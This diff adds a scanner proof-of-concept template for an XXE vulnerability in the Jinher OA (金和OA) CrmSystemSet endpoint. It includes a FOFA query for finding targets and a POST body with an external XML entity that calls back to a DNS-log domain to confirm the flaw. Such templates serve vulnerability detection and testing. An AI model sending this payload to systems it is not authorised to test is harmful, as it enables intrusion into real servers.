@@ -1,0 +1,36 @@
+id: poc-yaml-jinher-crmsystemset-xxe
+info:
+  name: 金和OA CrmSystemSet XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  - DNSLOG
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.CrmSystemSet/XMLHttp.aspx/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '<?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://{{.domain}}/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    contains(headers,"Cookie:") &&
+
+    reverse.Verify()
+
+    '
+transport: http
